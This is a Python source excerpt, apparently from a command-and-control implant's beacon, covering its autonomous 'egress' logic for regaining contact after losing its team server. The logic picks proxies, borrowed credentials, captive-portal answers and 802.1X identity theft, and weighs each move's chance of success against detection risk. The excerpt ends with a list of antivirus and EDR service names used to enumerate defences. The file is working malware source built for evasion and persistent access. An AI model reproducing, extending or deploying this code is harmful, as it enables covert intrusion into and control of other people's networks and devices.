    # would mean the implant always moved before the team server had even
    # been told it was stuck, and the two deciders racing on every drop.
    # One cycle has to have passed without an answer.
    #
    # A cycle on which the rescue could not even be *sent* is such a
    # cycle, and it is the one this feature exists for: with no DNS leg,
    # or a resolver that never answered, `_maybe_rescue` returns None
    # every cycle without sending anything, so no answer is ever coming.
    _EGRESS_FIRST_ACTING_CYCLE = 2

    # The two verbs `c2.proxy.mode: "none"` forbids. Not a second reading
    # of that setting -- `_proxy_prohibited` is the one that tests it, and
    # both verbs consult it themselves, so the prohibition binds tasking
    # as well -- but the list of rules there is no point carrying on such
    # a build. See `_egress_usable`.
    _EGRESS_PROXY_VERBS = ("proxy", "rediscover")

    # The rung-2 verbs that need the scout to have found something. They
    # are not refused by `read_egress_policy` -- that reader cannot see
    # `c2.way_out` -- and the arithmetic lets rung 2 through on a build
    # with no scout, so without this a rule naming one fired every stuck
    # cycle, spent the whole budget on a refusal the build guarantees, and
    # suppressed the gsocket latch with it. Dropped here for exactly the
    # reason a proxy verb is dropped on a build that forbids proxies.
    _EGRESS_SCOUT_VERBS = ("credential", "portal")

    # Which class each number is. `_RESCUE_CLASSES` maps the other way,
    # which is the direction the legs record in; this is the direction a
    # rule is read in, built from that same dict so that there is still
    # one list of class names in this file and not two.
    _EGRESS_CLASS_NAMES = {number: name
                           for name, number in _RESCUE_CLASSES.items()}

    def _egress_usable(self, rules: List[dict]) -> List[Tuple[int, dict]]:
        """The rules this build can fire, each with its number in the file.

        Only one thing is dropped: a proxy verb on a build whose
        `c2.proxy.mode` is `none`. That mode is an instruction about how
        this implant talks, so both proxy verbs refuse it already -- what
        is settled here is that such a rule does not also cost the
        *budget*, since an attempt spent on a refusal the build guarantees
        is an attempt the carrier does not get. Dropped when the policy is
        read rather than skipped on a stuck cycle, because the reason then
        reaches an operator while they still have a connection to read it
        over, and because a stuck cycle on an unreachable host is the
        worst moment to discover that a rule was never going to work --
        the same call `read_egress_policy` makes about a typo.

        The number travels with the rule and is its position in the
        operator's *file*: a dropped rule must not renumber the ones below
        it, or an attempt's log line would name a row they cannot find.
        """
        numbered = list(enumerate(rules, 1))
        for number, rule in numbered:
            self._egress_warn_tap_flags(number, rule)
        kept = []
        for number, rule in numbered:
            verb = rule.get("try")
            if self._proxy_prohibited() and verb in self._EGRESS_PROXY_VERBS:
                logger.warning(
                    "The egress decider will never use rule %d (try: %s): "
                    "this build's c2.proxy.mode is %r, which is an "
                    "instruction to connect directly rather than an absence "
                    "of one, so that verb is refused to the decider and to "
                    "tasking alike", number, verb, self.proxy_mode)
                continue
            if not self._way_out_enabled and verb in self._EGRESS_SCOUT_VERBS:
                logger.warning(
                    "The egress decider will never use rule %d (try: %s): "
                    "that verb borrows what the way-out scout found on the "
                    "tapped port, and c2.way_out is off on this build, so "
                    "every attempt would be a refusal that still cost an "
                    "attempt of the budget", number, verb)
                continue
            kept.append((number, rule))
        return kept

    # ── The way out: one file each way, and fresh or ignored ──
    #
    # The scout is a different process and may write files; this one may
    # not import it. So: the beacon writes `way_out_state.json` while a
    # stuck window is open and removes it when a leg delivers, and reads
    # `way_out_scout.json` when it is fresh. A document older than the
    # scout's publishing interval is ignored, so **a dead scout degrades to
    # today's five lines of evidence rather than to a stale decision** --
    # which is also what makes the model optional at runtime and not only
    # in the plan.
    #
    # **Nothing here raises.** All of it runs on the beacon thread inside a
    # loop with no guard of its own, and a read-only `/opt` or a full disk
    # must cost the implant nothing: the beacon is the access.

    def _way_out_path(self, name: str) -> str:
        return os.path.join(self._way_out_state_dir, name)

    def _way_out_publish_state(self) -> None:
        """Say that a stuck window is open, and on what evidence.

        One of the artefacts this project puts on the implant's disk, and
        they are a cost rather than a detail: the beacon keeps no task
        queue and writes nothing but persistence artefacts. This one is a
        line of JSON, it names no address, no zone and no key, and it is
        removed when a leg delivers. The beacon writes one more -- rung
        4's request -- and dhclient's lease; the scout writes three.
        `docs/WAY_OUT.md` has the table.
        """
        if not self._way_out_state_dir:
            return
        existing = self._way_out_read(_WAY_OUT_STATE_NAME,
                                      _WAY_OUT_STATE_VERSION) or {}
        # The budget is "per stuck window", and the window is this file --
        # which outlives the process. `_egress_spent` started at 0 on
        # every `Restart=always`, so the one bound on an implant acting
        # with nobody watching refilled on each restart. Adopted upward
        # only: a window cannot un-spend what it spent.
        spent = existing.get("spent")
        if isinstance(spent, int) and not isinstance(spent, bool):
            self._egress_spent = max(self._egress_spent, spent)
        self._way_out_write(_WAY_OUT_STATE_NAME, {
            "version": _WAY_OUT_STATE_VERSION,
            # When this window opened, kept across cycles so the scout
            # reads one timestamp rather than inferring it from a count.
            "opened": existing.get("opened") or time.time(),
            # When this was last written, which is how the scout tells a
            # week-long outage from a beacon that died with its window
            # file still on the disk. Without it a dead beacon left the
            # scout capturing and scanning the radio for ever.
            "touched": time.time(),
            "stuck_cycles": self._stuck_cycles,
            "hours_dark": self._way_out_hours_dark(),
            "evidence": self._egress_state(),
            "spent": self._egress_spent,
            "budget": self._egress_budget,
        })

    def _way_out_record_attempt(self, attempt: dict) -> None:
        """Record one attempt: on the trail, and spend it in the window.

        **The trail is written here**, and it was the scout's. The scout
        copied new lines from the window's file on its own publishing
        clock, which lost every attempt made in the last interval of a
        window -- a leg delivering removes that file, and on a recovered
        implant the lost line is the attempt that *worked* -- and
        duplicated what it had already copied when its unit restarted.
        This process is the only one that knows an attempt was made, it is
        already writing in that directory, and the trail is append-only,
        so a restart of either side is harmless.

        **The window's file keeps the count and not the attempts.** It
        carried a growing list of every entry as well, which nothing read
        -- the scout takes `evidence` and the model takes the same -- and
        which the whole file is rewritten with on every attempt. There is
        no upper bound on `budget`, so an operator who wrote a large one
        had a file that grew by a full attempt record, rewritten each
        time, for the length of the outage. `spent` is what a restarted
        beacon needs from it; the trail beside it is the record.

        Raises nothing. A trail that cannot be written costs the record
        and not the attempt: the attempt is in this beacon's log either
        way.
        """
        if not self._way_out_state_dir:
            return
        entry = dict(attempt)
        entry.setdefault("at", time.time())
        state = self._way_out_read(_WAY_OUT_STATE_NAME,
                                   _WAY_OUT_STATE_VERSION)
        if state is not None:
            entry.setdefault("window", state.get("opened"))
            state["spent"] = self._egress_spent
            self._way_out_write(_WAY_OUT_STATE_NAME, state)
        self._way_out_append_trail(entry)

    def _way_out_append_trail(self, entry: dict) -> None:
        """One line onto the append-only trail. Raises nothing.

        Opened `O_APPEND` and `O_NOFOLLOW` at 0600, as `handoff.py` does
        for the same file from the other side: a link planted at this name
        would have the root beacon appending wherever it pointed.
        """
        path = self._way_out_path(_WAY_OUT_TRAIL_NAME)
        try:
            flags = (os.O_WRONLY | os.O_CREAT | os.O_APPEND
                     | getattr(os, "O_NOFOLLOW", 0))
            descriptor = os.open(path, flags, 0o600)
            try:
                os.write(descriptor,
                         (json.dumps(entry, sort_keys=True, default=str)
                          + "\n").encode("utf-8"))
            finally:
                os.close(descriptor)
        except Exception as exc:
            logger.warning(
                "way out: the trail %s could not be appended to (%s); the "
                "attempt is in this beacon's log and nowhere else", path, exc)

    def _way_out_clear_state(self) -> None:
        """Remove the state file: this window is over. Raises nothing."""
        if not self._way_out_state_dir:
            return
        try:
            os.unlink(self._way_out_path(_WAY_OUT_STATE_NAME))
        except OSError:
            pass

    def _way_out_document(self) -> Optional[dict]:
        """The scout's document, if there is a fresh one. Raises nothing.

        **Fresh means a window on both sides.** Older than
        `document_max_age_seconds` is a dead or stopped scout; *newer than
        now* is a clock that jumped, and a document from the future would
        otherwise be eternally fresh -- which would turn the one rule that
        makes a dead scout harmless into the one that makes a stale
        decision permanent.
        """
        document = self._way_out_read(_WAY_OUT_DOCUMENT_NAME,
                                      _WAY_OUT_DOCUMENT_VERSION)
        if document is None:
            return None
        published = document.get("published")
        if not isinstance(published, (int, float)) or isinstance(published,
                                                                 bool):
            return None
        age = time.time() - float(published)
        if age < 0 or age > self._way_out["document_max_age_seconds"]:
            return None
        return document

    def _way_out_absorb_flags(self) -> None:
        """OR the tap's two flags into this cycle's rescue record.

        This is what makes `dot1x_seen` and `portal_answered` live. They
        were in the record's format and rendered by the team server and
        nothing set them, because no 802.1X sensing and no captive-portal
        detection existed here; the scout does both, and this is where its
        finding becomes a bit the panel shows and a name a rule may match.

        **Only the tap's two.** `proxy_found` and `dns_answered` are
        findings of a *leg* -- a proxy that refused this implant, a
        resolver that answered it -- so absorbing them from a document
        would let the scout claim something no leg had tried.
        """
        document = self._way_out_document()
        if document is None:
            return
        tap = document.get("tap")
        if not isinstance(tap, dict):
            return
        names = tap.get("flags")
        if not isinstance(names, list):
            return
        for name in names:
            bit = _WAY_OUT_TAP_FLAGS.get(name) if isinstance(name, str) \
                else None
            if bit is not None:
                self._rescue_flags |= bit

    def _way_out_recommendation(self, state: dict) -> Optional[dict]:
        """The scout's recommendation for *this* evidence, or None.

        Matched against the evidence it was made for, and not merely
        fresh: the scout publishes on its own clock, so a document written
        one cycle ago describes the legs as they were then. A
        recommendation for other evidence is set aside out loud -- it is
        the one case where the operator wants to know the model answered
        and was not used.
        """
        document = self._way_out_document()
        if document is None:
            return None
        advice = document.get("recommendation")
        if not isinstance(advice, dict):
            return None
        verb = advice.get("verb")
        if not isinstance(verb, str) or verb not in EGRESS_VERBS:
            logger.warning(
                "way out: the scout recommended %r, which is not one of the "
                "verbs a decision may name (%s), so the policy decides this "
                "cycle", verb, ", ".join(EGRESS_VERBS))
            return None
        if document.get("evidence") != state:
            logger.warning(
                "way out: the scout's recommendation (`egress %s`) was made "
                "for other evidence than this cycle's, so the policy decides "
                "instead", verb)
            return None
        return advice

    # ── The ladder, which is arithmetic and not a policy line ──
    #
    # `points * p_success > risk_coefficient * p_detect`, the inequality
    # `gate.py:361-363` uses, with the two terms that move on a dark
    # implant:
    #
    #   * **`points` grows with time dark.** `points` is the value of what
    #     the action unlocks, and that value is not constant: a channel
    #     restored in the first hour is worth a check-in, and one restored
    #     after a week is the difference between an operation and a dead
    #     device in a rack. This is the human's stated appetite -- dark is
    #     useless -- as a number rather than as a rule that fires.
    #   * **`p_detect` moves with the evidence.** `dot1x_seen` raises the
    #     identity rung's; `portal_answered` lowers the borrow rung's.
    #
    # With `points` fixed and the priors in the table, the inequality would
    # be a *constant per rung*, decided when the table was authored: either
    # high enough that the loudest rung always passes, in which case the
    # gate orders nothing, or low enough that it never fires. The server's
    # moving term -- `effective_p_detect`, which climbs with a campaign's
    # detection count -- has no analogue here.
    #
    # **Both paths go through this.** The policy evaluator and the scout's
    # recommendation alike; a gate only the model honoured would have left
    # the no-model fallback reaching the loud rungs ungated.

    def _way_out_points(self) -> int:
        """The value of a restored channel, at this much time dark.

        Floored to whole hours: the curve is a statement about how long
        this implant has been useless, and half an hour is not an hour.

        **Bounded by the cycle count as well, and that is not belt and
        braces.** Time dark is `stuck_cycles * interval`, and `interval`
        has a floor but no ceiling and is settable from the config *and*
        by the `sleep` task verb -- so `beacon_interval_seconds: 86400`
        made two stuck cycles read as 48 hours and handed the irreversible
        rung the first cycle the decider may act. "A rescue that starts
        loud" is a named anti-goal of this design, and the operator must
        not be able to buy one with a number in a file. So a cycle is
        worth at most one step of the curve, whatever the clock says: the
        ladder needs elapsed time *and* repeated failure.
        """
        hours = min(int(self._way_out_hours_dark()), int(self._stuck_cycles))
        return min(int(self._way_out["points_max"]),
                   int(_WAY_OUT_ROWS[_WAY_OUT_ROW_OF[2]][0])
                   + int(self._way_out["points_per_hour"]) * hours)

    def _way_out_clamp(self, prior: float, proposed) -> float:
        """Bound an advisory probability to +-0.2 around the prior.

        A copy of `safety.clamp_llm_adjustment`, for the reason the rows
        above are copies. A proposal that is not a finite number is
        discarded in favour of the prior, which is the same stance
        `read_egress_policy` takes toward a rule it cannot read.
        """
        try:
            value = float(proposed)
        except (TypeError, ValueError):
            return prior
        if value != value:          # NaN, without importing math
            return prior
        value = max(prior - _WAY_OUT_CLAMP_SPAN,
                    min(prior + _WAY_OUT_CLAMP_SPAN, value))
        return max(_WAY_OUT_P_MIN, min(_WAY_OUT_P_MAX, value))

    def _way_out_allows(self, verb: str, p_success=None) -> Tuple[bool, dict]:
        """Whether this rung may be taken now, and the numbers behind it.

        The numbers come back whatever the answer, because they are what
        the trail carries: a decision nobody can reconstruct is worse than
        a policy, since the policy at least names the rule that matched.

        Never raises: this is consulted on the beacon thread inside a loop
        with no guard of its own.
        """
        rung = _WAY_OUT_RUNG_OF.get(verb)
        if rung is None:
            # A verb with no price. Refused rather than allowed, which is
            # the only safe default: the alternative is an unpriced move on
            # a device nobody can reach.
            return False, {"rung": 0, "row": "", "allowed": False,
                           "why": "`egress %s` has no rung, so nothing "
                                  "prices it and it is refused" % verb}
        if not self._way_out_enabled:
            if rung <= _WAY_OUT_UNGATED_RUNG:
                # Exactly today's behaviour: the three verbs the decider
                # has always had, ordered by the operator's policy and
                # bounded by its budget.
                return True, {"rung": rung, "row": "", "allowed": True,
                              "why": "rung %d, which this build has always "
                                     "allowed its decider" % rung}
            return False, {
                "rung": rung, "row": _WAY_OUT_ROW_OF[rung], "allowed": False,
                "why": "rung %d needs the arithmetic that prices it, and "
                       "c2.way_out is off on this build, so it is refused "
                       "rather than taken unpriced" % rung}

        row = _WAY_OUT_ROW_OF[rung]
        _, prior_success, prior_detect = _WAY_OUT_ROWS[row]
        points = self._way_out_points()
        detect = self._way_out_detect(rung, prior_detect)
        success = (self._way_out_clamp(prior_success, p_success)
                   if p_success is not None else prior_success)
        coefficient = float(self._way_out["risk_coefficient"])
        threshold = float(self._way_out["ev_threshold"])
        ev = points * success - coefficient * detect
        ev_prior = points * prior_success - coefficient * detect
        allowed = ev > threshold
        numbers = {
            "rung": rung,
            "row": row,
            "hours_dark": round(self._way_out_hours_dark(), 2),
            "points": points,
            "p_success": success,
            "p_success_prior": prior_success,
            "p_detect": detect,
            "p_detect_prior": prior_detect,
            "risk_coefficient": coefficient,
            "threshold": threshold,
            "ev": ev,
            "ev_prior": ev_prior,
            "allowed": allowed,
            # Marked the way `override_decisive` marks it on the server, so
            # the trail says which decisions rested on a model's estimate
            # rather than on the table.
            "override_decisive": allowed and not ev_prior > threshold,
        }
        numbers["why"] = (
            "rung %d (%s): %d points * %.2f p_success = %.1f against %.0f * "
            "%.2f p_detect = %.1f, so EV %.1f %s threshold %.1f"
            % (rung, row, points, success, points * success, coefficient,
               detect, coefficient * detect, ev,
               "exceeds" if allowed else "does not exceed", threshold))
        return allowed, numbers

    def _way_out_detect(self, rung: int, prior: float) -> float:
        """`p_detect` for this rung, moved by the evidence.

        One modifier per rung and no more, because each says something true
        of that rung alone: a port that authenticates is watched, so taking
        its identity is likelier to be noticed; a network that redirects
        every browser sees credential prompts answered all day, so
        borrowing one is less likely to be.
        """
        detect = float(prior)
        flags = self._egress_state()["flags"]
        if rung == 4 and "dot1x_seen" in flags:
            detect += float(self._way_out["dot1x_detect"])
        if rung == 2 and "portal_answered" in flags:
            detect += float(self._way_out["portal_detect"])
        return max(_WAY_OUT_P_MIN, min(_WAY_OUT_P_MAX, detect))

    def _way_out_hours_dark(self) -> float:
        """How long this outage has lasted, in hours, from the cycle count.

        The beacon's own interval and not a clock: `_stuck_cycles` is the
        one measure of an outage this process keeps, it survives nothing it
        should not, and a wall clock would make the curve above depend on
        an NTP a dropped implant cannot reach.
        """
        return (self._stuck_cycles * max(1, int(self.interval))) / 3600.0

    def _way_out_read(self, name: str, version: int) -> Optional[dict]:
        if not self._way_out_state_dir:
            return None
        try:
            with open(self._way_out_path(name), "rb") as handle:
                loaded = json.loads(handle.read().decode("utf-8"))
        except (OSError, ValueError, UnicodeDecodeError):
            return None
        if not isinstance(loaded, dict) or loaded.get("version") != version:
            return None
        return loaded

    def _way_out_write(self, name: str, document: dict) -> None:
        """One small JSON file 0600, whole or not at all. Raises nothing.

        The shape `tunnel/shell.py` writes its sidecar with: a scratch
        file in the same directory, fsynced, moved over the target, so the
        scout never reads half a document. A copy and not an import, for
        the reason at the top of this file.
        """
        path = self._way_out_path(name)
        scratch = ""
        try:
            # The same reading `handoff._ensure_dir` does, and for the
            # same reasons: a directory somebody else made keeps its mode
            # unless this tightens it, and a symlink to a directory
            # answers `isdir` with True -- so a link planted at this name
            # would have the root beacon writing its state wherever
            # somebody else chose. Two of the six files are written here.
            directory = os.path.dirname(path)
            try:
                found = os.lstat(directory)
            except OSError:
                found = None
            if found is None:
                os.makedirs(directory, mode=0o700, exist_ok=True)
                os.chmod(directory, 0o700)
            elif stat.S_ISLNK(found.st_mode):
                raise ValueError(
                    "%s is a symbolic link, and following it would write "
                    "this implant's state wherever somebody else chose"
                    % directory)
            elif not stat.S_ISDIR(found.st_mode):
                raise ValueError("%s is not a directory" % directory)
            elif stat.S_IMODE(found.st_mode) != 0o700:
                os.chmod(directory, 0o700)
            data = (json.dumps(document, sort_keys=True) + "\n").encode()
            descriptor, scratch = tempfile.mkstemp(
                prefix="." + name + ".", dir=directory)
            with os.fdopen(descriptor, "wb") as handle:
                handle.write(data)
                handle.flush()
                os.fsync(handle.fileno())
            os.chmod(scratch, 0o600)
            os.replace(scratch, path)
            scratch = ""
        except Exception as exc:
            # One line, and the beacon carries on. A read-only /opt or a
            # full disk costs the operator the trail and nothing else.
            logger.warning(
                "way out: %s could not be written (%s), so the scout will "
                "not see this window. The beacon is unaffected", path, exc)
            if scratch:
                try:
                    os.unlink(scratch)
                except OSError:
                    pass

    def _egress_warn_tap_flags(self, number: int, rule: dict) -> None:
        """Name a rule that can never match because there is no scout.

        `dot1x_seen` and `portal_answered` were refused by name while
        nothing set them. The scout sets them now, so the refusal is gone
        -- but on a build where `c2.way_out` is off, a rule naming one is
        back to being a rule that can never fire. Said out loud rather
        than refused: `read_egress_policy` cannot see `c2.way_out`, and
        this is the same situation as a `gsocket` rule on a build with no
        carrier binary, which is tolerated.

        Not **dropped**, either, and that is the difference from the proxy
        case above. A rule the build guarantees will be refused costs the
        budget when it fires; a rule that can never match costs nothing,
        because it never matches. So the operator gets the sentence and
        keeps their numbering.
        """
        if self._way_out_enabled:
            return
        named = [name for name in rule.get("when", {}).get("flags", [])
                 if name in _WAY_OUT_TAP_FLAGS]
        if not named:
            return
        logger.warning(
            "The egress decider's rule %d names %s, which only the scout "
            "sets -- and c2.way_out is off on this build, so nothing here "
            "watches the tapped port and that rule can never match. Switch "
            "c2.way_out.enabled on, or write the rule against a leg's "
            "evidence instead", number, " and ".join(named))

    def _egress_state(self) -> dict:
        """This cycle's rescue evidence, in the names a rule says.

        The record as the team server renders it: one class per transport,
        with a leg that recorded nothing reading as `not_attempted`, which
        is what `_rescue_pack` packs for it. So a rule is written against
        the same five lines the operator reads in the panel, rather than
        against a second and narrower vocabulary.

        A plain dict and not this beacon, because the design fixes this
        shape: a decision engine that replaced the decision would be
        handed this and nothing else.
        """
        legs = {}
        for transport in _RESCUE_TRANSPORTS:
            klass = self._leg_status.get(transport, (0, 0))[0]
            # `_record_leg` clamps rather than validates, so a number no
            # class has is reachable in principle. Rendered as itself:
            # every name a rule may say was checked against
            # `_RESCUE_CLASSES` when the policy was read, so a number
            # cannot match one, and the log stays readable.
            legs[transport] = self._EGRESS_CLASS_NAMES.get(klass, str(klass))
        return {
            "legs": legs,
            "flags": [name for name, bit in _EGRESS_FLAG_BITS.items()
                      if self._rescue_flags & bit],
        }

    @staticmethod
    def _egress_holds(when: Dict[str, List[str]], state: dict) -> bool:
        """Whether one rule's condition holds against that evidence.

        Every key of a `when` has to hold, which `read_egress_policy`
        records and argues: adding a key can then only narrow, and that is
        the reading which cannot surprise somebody who is not there to be
        surprised.

        Within one key, a list of names is **any of these**. For a
        transport it could not be anything else -- a leg carries exactly
        one class, so "all of them" could never hold -- and `flags` is
        read the same way so that a list means one thing in this file
        rather than two. The cost is honest: "both flags at once" is not
        expressible, and two rules with one flag each is how a policy says
        "either".
        """
        for key, names in when.items():
            if key == _EGRESS_WHEN_FLAGS:
                if not any(name in state["flags"] for name in names):
                    return False
            elif key == _EGRESS_WHEN_ANY:
                if not any(klass in names for klass in state["legs"].values()):
                    return False
            elif state["legs"].get(key) not in names:
                return False
        return True

    def _egress_evaluate(self, state: dict) -> Optional[Tuple[int, dict]]:
        """The first rule `state` matches: its number in the file, and it.

        One argument in, one choice out, which is the shape the design
        fixes for a later decision engine. The order is the operator's and
        nothing here sorts or prefers: the first rule that holds *is* the
        policy, and that is also why a rule the gate dropped is simply not
        in this list rather than skipped over here.
        """
        for number, rule in self._egress_rules:
            if self._egress_holds(rule["when"], state):
                return number, rule
        return None

    def _egress_decide(self) -> Optional[str]:
        """Which verb this cycle's evidence chooses, or None for no rule.

        Three steps, and the first two are this project's:

          1. read the scout's document, if it is fresh;
          2. if it carries a recommendation for *this* evidence, take it;
          3. otherwise evaluate the operator's policy, exactly as before.

        So the beacon never blocks on inference, never imports a client,
        and behaves identically when the scout is absent -- which is what
        keeps this file stdlib-only and makes the model optional at
        runtime as well as in the plan.

        It reads `_leg_status`, `_rescue_flags`, the policy and the
        document, and no other state of this beacon: not the clock, not
        the budget, not the stuck counter, not which legs are configured.
        That narrowness is what made it the seam the previous design named
        for a decision engine, and the engine arriving has not widened it.

        `_egress_act` asks `_egress_choose` rather than this, because its
        one log line names what chose and this answer is that answer with
        the reason dropped. No match and no attempt are the same thing
        here: None, and a cycle in which the implant did nothing to itself.
        """
        chosen = self._egress_choose(self._egress_state())
        return chosen["verb"] if chosen is not None else None

    def _egress_choose(self, state: dict) -> Optional[dict]:
        """What this cycle's evidence chooses first, and what chose it.

        `{"verb", "chose", "rule", "argument", "p_success"}`, or None. The
        `chose` key is the whole reason this returns a mapping rather than
        a verb: the trail has to say whether the model or the policy
        picked, and a decision nobody can reconstruct is worse than a
        policy -- the policy at least names the rule that matched.

        The *first* of `_egress_candidates`, which is what `_egress_decide`
        answers with. `_egress_act` walks the whole list, because a rung
        the arithmetic refuses must not take the cycle with it.
        """
        for candidate in self._egress_candidates(state):
            return candidate
        return None

    def _egress_candidates(self, state: dict):
        """Every verb this cycle's evidence offers, in the order to try.

        The scout's recommendation first when there is a fresh one for
        this evidence -- it is the decision the model was asked for -- and
        then the operator's policy in their own order. The model's answer
        is a *proposal*, so a refused one falls through to the policy
        rather than ending the cycle: "the beacon degrades to the policy"
        is a claim this design makes in three places and it was not true
        of the code.
        """
        advice = self._way_out_recommendation(state)
        if advice is not None:
            yield {
                "verb": advice["verb"],
                "chose": "model",
                "rule": 0,
                "argument": advice.get("argument") or "",
                "p_success": advice.get("p_success"),
                "why": advice.get("why") or "",
            }
        for number, rule in self._egress_rules:
            if self._egress_holds(rule["when"], state):
                yield {"verb": rule["try"], "chose": "policy",
                       "rule": number, "argument": "", "p_success": None,
                       "why": "rule %d (when %s)" % (number, rule["when"])}

    def _egress_proxy_target(self) -> Optional[str]:
        """Which discovered proxy to select, or None if there is none to.

        The URL rather than the index, though `egress proxy` takes either:
        the two name the same list, and a URL is what makes the attempt's
        log line say which proxy was tried.

        The active one is skipped. `proxy_found` is set where a proxy that
        exists *refused us* -- see `_https_post` -- so a rule that chose
        this verb fired because the proxy in use is the problem, and
        selecting it again would spend an attempt confirming that. A PAC
        entry is skipped for the reason the verb itself refuses one: it
        names proxies rather than being one, so it could only ever spend
        an attempt on a refusal.

        No discovery is run here. The last one is what `egress proxy`
        selects from, and a policy that wants a fresh list says so with a
        `rediscover` rule above its `proxy` rule -- which is the operator
        ordering two attempts, not this method deciding to make one.
        """
        active = self._proxy.active or {}
        for candidate in self._proxy.proxies:
            url = candidate.get("url")
            if not url or candidate.get("is_pac"):
                continue
            if url == active.get("url"):
                continue
            return url
        return None

    def _egress_task(self, verb: str, argument: str = "") -> Optional[str]:
        """The task for `verb`, as an operator would type it, or None.

        None is an attempt declined rather than made: the rule holds and
        this host has nothing for it to work on. It costs no budget, so
        the latch behind the decider still brings the carrier up on that
        cycle.

        **`argument` is what the decision chose**, and carrying it is the
        design's central reason for a model here at all: once the moves
        take arguments -- which credential, which SSID -- the policy
        becomes a table nobody maintains. It was collected and dropped
        until a review said so, and every verb ran bare.

        A model wrote that string, so it is bounded here rather than
        trusted: whitespace would make `_exec_egress`'s split read it as a
        different verb's argument, and nothing downstream could tell. An
        argument with any in it is dropped and the verb runs bare, which
        every verb's own refusal can explain.

        `egress proxy`'s argument is still chosen *here* when the decision
        named none, because which proxy to try is a fact about this host
        rather than about the evidence -- and the decision has to stay
        narrow enough for something else to make it.
        """
        argument = (argument or "").strip()
        if argument and argument.split() != [argument]:
            logger.warning(
                "way out: the decision's argument for `egress %s` is %r, "
                "which carries whitespace and would be read as another "
                "verb's; the verb was run with none", verb, argument)
            argument = ""
        if argument:
            return "%s %s" % (verb, argument)
        if verb != "proxy":
            return verb
        target = self._egress_proxy_target()
        if target is None:
            # Debug and not a warning: this is one line per stuck cycle for
            # as long as the rule keeps holding, and the section above says
            # what a per-cycle line costs on a channel nobody is reading.
            logger.debug(
                "egress decider: a rule chose `egress proxy` and discovery "
                "has found nothing on this host to select, so no attempt "
                "was made")
            return None
        return "proxy %s" % target

    def _egress_act(self) -> bool:
        """Make at most one autonomous attempt to get out; did it make one?

        Called from the stuck branch of `_beacon_loop`, after the rescue
        has had its chance -- the order matters and that branch says why.
        False is every reason there is not to act: the decider is off, it
        is too early in this window, the team server answered, the budget
        is spent, no rule holds, or the rule that holds has nothing to
        work on. The branch reads that False as "the latch is the
        carrier's fallback this cycle".

        **Never raises**, for the reason `_gsocket_start` gives: this runs
        on the beacon thread inside a loop with no guard of its own, so an
        exception here would cost the implant its loop -- which is worse
        than any failed attempt.
        """
        if not self._egress_enabled:
            return False
        if self._stuck_cycles < self._EGRESS_FIRST_ACTING_CYCLE:
            return False
        if self._rescue_answered:
            return False
        if self._egress_spent >= self._egress_budget:
            return False
        state = self._egress_state()
        chosen = numbers = task = None
        # **Every candidate, not only the first.** The gate used to end the
        # cycle the moment it refused whatever was chosen, so one loud
        # rule -- or a model that keeps naming `identity`, which this
        # design's own measurements record it doing -- silenced every
        # quieter rule below it for hours. A rung the arithmetic refuses
        # costs nothing, so the next candidate gets the cycle: that is
        # what "the beacon degrades to the policy" has to mean to be true.
        #
        # And the same for a candidate that *declines* -- `_egress_task`
        # returning None, which is the rule holding with nothing on this
        # host for it to work on. It is resolved inside this walk for that
        # reason: resolved after it, a `proxy` rule on a host where
        # discovery has found nothing ended the cycle, so the `rediscover`
        # rule under it -- the one that would have given it a candidate --
        # was never reached.
        for candidate in self._egress_candidates(state):
            allowed, priced = self._way_out_allows(
                candidate["verb"], candidate.get("p_success"))
            if allowed:
                task = self._egress_task(candidate["verb"],
                                         candidate.get("argument") or "")
                if task is None:
                    continue
                chosen, numbers = candidate, priced
                break
            logger.warning(
                "Egress decider: %s chose `egress %s` after %d stuck "
                "cycle(s), and the arithmetic refuses it -- %s. Nothing was "
                "attempted, no budget was spent, and the next candidate of "
                "this cycle is tried instead",
                candidate["chose"], candidate["verb"], self._stuck_cycles,
                priced["why"])
        if chosen is None or task is None:
            return False
        verb = chosen["verb"]

        # Spent before the attempt and not after, so that whatever the
        # verb does -- including raising -- this window is one attempt
        # nearer its bound. The alternative is a verb that fails in a new
        # way costing nothing and being tried again every cycle.
        self._egress_spent += 1
        try:
            outcome = self._exec_egress(task)
        except Exception as exc:
            # Spelled as `_execute_task` spells it, since this is the same
            # dispatch answering the same way, and it is the operator who
            # reads both.
            outcome = "[exception: %s]" % exc
        # One line, and everything an operator needs from it: what chose
        # and why, the verb as they would have typed it, the rung and the
        # numbers that let it through, what this window has now spent, and
        # what came back. The outcome is the verb's own answer, which is
        # deliberately about what was *changed* and not about whether the
        # implant can now get out -- the next cycle's legs report that.
        logger.warning(
            "Egress decider: no upstream leg has delivered for %d cycles, so "
            "the %s chose `egress %s` (%s)%s -- attempt %d of %d in this "
            "stuck window. It answered: %s",
            self._stuck_cycles, chosen["chose"], task, chosen["why"],
            ", allowed by " + numbers["why"] if numbers.get("row") else "",
            self._egress_spent, self._egress_budget, outcome)
        # The trail's line, into the window's own file and onto the trail
        # itself. The trail outlives this window: it is what makes a
        # burned implant a lesson instead of a mystery.
        self._way_out_record_attempt({
            "chose": chosen["chose"],
            "rule": chosen["rule"],
            "why": chosen["why"],
            "verb": verb,
            "argument": task[len(verb):].strip(),
            "task": task,
            "gate": numbers,
            "spent": self._egress_spent,
            "budget": self._egress_budget,
            "evidence": self._egress_state(),
            "outcome": outcome,
        })
        return True

    # ── AV / EDR enumeration ──

    _AV_SERVICES_WIN = [
        ("WinDefend", "Windows Defender", "av"),
        ("Sense", "Defender for Endpoint (EDR)", "edr"),
        ("CbDefense", "Carbon Black Defense", "edr"),
        ("CbDefenseSensor", "Carbon Black Sensor", "edr"),
        ("CSFalconService", "CrowdStrike Falcon", "edr"),
        ("SentinelAgent", "SentinelOne", "edr"),
        ("SentinelStaticEngine", "SentinelOne Static", "edr"),
        ("cyabortsvc", "Cortex XDR", "edr"),
        ("CortexXDR", "Cortex XDR", "edr"),
        ("elastic-agent", "Elastic Agent", "edr"),
        ("elastic-endpoint", "Elastic Endpoint", "edr"),
        ("xagt", "Trellix/FireEye HX", "edr"),
        ("CylanceSvc", "Cylance", "edr"),
        ("TaniumClient", "Tanium", "edr"),
        ("QualysAgent", "Qualys Agent", "edr"),
        ("ir_agent", "Rapid7 InsightAgent", "edr"),
        ("AVP", "Kaspersky", "av"),
        ("klnagent", "Kaspersky Network Agent", "av"),
        ("EPSecurityService", "Bitdefender", "av"),
        ("BDAuxSrv", "Bitdefender Aux", "av"),
        ("SAVService", "Sophos AV", "edr"),
        ("SophosAgent", "Sophos Agent", "edr"),
        ("hmpalert", "Sophos Intercept X", "edr"),
        ("McShield", "McAfee/Trellix", "av"),
        ("masvc", "McAfee Agent", "av"),
        ("mfemms", "McAfee Management", "av"),
